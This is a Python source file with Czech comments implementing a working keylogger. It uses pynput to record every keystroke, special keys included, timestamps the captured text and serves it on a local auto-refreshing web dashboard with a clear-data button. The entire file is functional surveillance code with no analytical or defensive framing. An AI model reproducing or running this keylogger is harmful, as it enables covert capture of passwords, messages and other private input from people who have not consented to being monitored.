import pynput.keyboard
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import time
import os
import json
from datetime import datetime

class KeyloggerWithServer:
    def __init__(self, time_interval=10, exit_phrase="stopnow", port=8888):
        self.log = ""
        self.interval = time_interval
        self.exit_phrase = exit_phrase
        self.is_running = True
        self.port = port
        self.captured_data = []
        self.server_thread = None
        
    def append_to_log(self, string):
        """Přidá text do logu a kontroluje exit frázi"""
        self.log += string
        
        # Kontrola exit fráze
        if self.exit_phrase in self.log.lower():
            self.stop()
    
    def process_key_press(self, key):
        """Zpracuje stisk klávesy"""
        try:
            current_key = str(key.char)
        except AttributeError:
            # Speciální klávesy
            special_keys = {
                key.space: " ",
                key.enter: " [ENTER]\n",
                key.backspace: " [BACKSPACE] ",
                key.tab: " [TAB] ",
                key.shift: " [SHIFT] ",
                key.ctrl_l: " [CTRL] ",
                key.ctrl_r: " [CTRL] ",
                key.alt_l: " [ALT] ",
                key.alt_r: " [ALT] ",
                key.cmd: " [WIN] ",
                key.caps_lock: " [CAPS] ",
                key.delete: " [DEL] ",
                key.up: " [UP] ",
                key.down: " [DOWN] ",
                key.left: " [LEFT] ",
                key.right: " [RIGHT] ",
                key.esc: " [ESC] ",
            }
            current_key = special_keys.get(key, f" [{str(key).replace('Key.', '').upper()}] ")
        
        self.append_to_log(current_key)
    
    def report(self):
        """Uloží log do paměti každých X sekund"""
        if self.log:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.captured_data.append(f"[{timestamp}] {self.log}")
            
            # Omezení na posledních 1000 záznamů (pro paměť)
            if len(self.captured_data) > 1000:
                self.captured_data = self.captured_data[-1000:]
                
            self.log = ""
        
        if self.is_running:
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()
    
    class RequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            """Zpracuje HTTP požadavek"""
            keylogger = self.server.keylogger
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # HTML stránka
            html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Keylogger Results</title>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {{ 
                        font-family: 'Segoe UI', Arial, sans-serif; 
                        margin: 0; 
                        padding: 20px; 
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                    }}
                    .container {{ 
                        background: white; 
                        padding: 30px; 
                        border-radius: 15px;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                        max-width: 1000px;
                        margin: 0 auto;
                    }}
                    .header {{ 
                        text-align: center; 
                        margin-bottom: 30px;
                        border-bottom: 2px solid #f0f0f0;
                        padding-bottom: 20px;
                    }}
                    .entry {{ 
                        margin: 15px 0; 
                        padding: 15px; 
                        background: #f8f9fa; 
                        border-radius: 8px;
                        border-left: 4px solid #667eea;
                        word-wrap: break-word;
                    }}
                    .timestamp {{ 
                        color: #6c757d; 
                        font-size: 0.85em; 
                        font-weight: bold;
                        margin-bottom: 5px;
                    }}
                    .controls {{ 
                        margin: 20px 0; 
                        text-align: center;
                    }}
                    .stats {{ 
                        background: #e9ecef; 
                        padding: 15px; 
                        border-radius: 8px;
                        margin: 20px 0;
                        text-align: center;
                    }}
                    .auto-reload {{
                        text-align: center;
                        margin-top: 20px;
                        font-style: italic;
                        color: #6c757d;
                    }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1 style="color: #333; margin: 0;">🎯 Keylogger Live Data</h1>
                        <p style="color: #666; margin: 10px 0 0 0;">
                            Real-time keyboard capture - Exit phrase: <strong>{keylogger.exit_phrase}</strong>
                        </p>
                    </div>
                    
                    <div class="stats">
                        <strong>Total Entries:</strong> {len(keylogger.captured_data)} | 
                        <strong>Check Interval:</strong> {keylogger.interval}s |
                        <strong>Port:</strong> {keylogger.port}
                    </div>
                    
                    <div class="controls">
                        <button onclick="location.reload()">🔄 Refresh Now</button>
                        <button onclick="clearData()">🗑️ Clear All Data</button>
                    </div>
                    
                    <div id="results">
            """
            
            # Posledních 50 záznamů (od nejnovějšího)
            for entry in reversed(keylogger.captured_data[-50:]):
                parts = entry.split("]", 1)
                if len(parts) == 2:
                    timestamp, content = parts
                    html += f'''
                    <div class="entry">
                        <div class="timestamp">{timestamp}]</div>
                        <div class="content">{content}</div>
                    </div>
                    '''
            
            html += f"""
                    </div>
                    
                    <div class="auto-reload">
                        🔄 Auto-refreshing every 5 seconds...
                    </div>
                </div>
                
                <script>
                    function clearData() {{
                        if (confirm('Are you sure you want to clear all captured data?')) {{
                            fetch('/clear', {{ method: 'POST' }})
                                .then(() => location.reload());
                        }}
                    }}
                    
                    // Auto refresh every 5 seconds
                    setTimeout(() => location.reload(), 5000);
                    
                    // Scroll to bottom on load
                    window.scrollTo(0, document.body.scrollHeight);
                </script>
            </body>
            </html>
            """
            
            self.wfile.write(html.encode('utf-8'))
        
        def do_POST(self):
            """Zpracuje POST požadavek pro mazání dat"""
            if self.path == '/clear':
                keylogger = self.server.keylogger
                keylogger.captured_data.clear()
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'cleared'}).encode())
            else:
                self.send_error(404)
        
        def log_message(self, format, *args):
            """Potlačí logování HTTP požadavků"""
            return
    
    def start_server(self):
        """Spustí HTTP server"""
        class CustomHTTPServer(HTTPServer):
            def __init__(self, *args, **kwargs):
                HTTPServer.__init__(self, *args, **kwargs)
                self.keylogger = self.RequestHandlerClass.keylogger
        
        self.RequestHandler.keylogger = self
        
        try:
            server = CustomHTTPServer(('127.0.0.1', self.port), self.RequestHandler)
            server.serve_forever()
        except OSError as e:
            # Port může být již obsazený
            pass
    
    def stop(self):
        """Ukončí program"""
        self.is_running = False
        os._exit(0)
    
    def start(self):
        """Hlavní metoda pro spuštění keyloggeru"""
        # Spustí server v samostatném vlákně
        self.server_thread = threading.Thread(target=self.start_server)
        self.server_thread.daemon = True
        self.server_thread.start()
        
        # Spustí keylogger
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        keyboard_listener.daemon = True
        keyboard_listener.start()
        
        # Spustí periodické reportování
        self.report()
        
        # Hlavní smyčka - udržuje program běžící
        try:
            while self.is_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

# Spuštění keyloggeru
if __name__ == "__main__":
    keylogger = KeyloggerWithServer(
        time_interval=10,      # Každých 10 sekund ukládá data
        exit_phrase="stopnow", # Fráze pro ukončení
        port=8888              # Port webového rozhraní
    )
    keylogger.start()
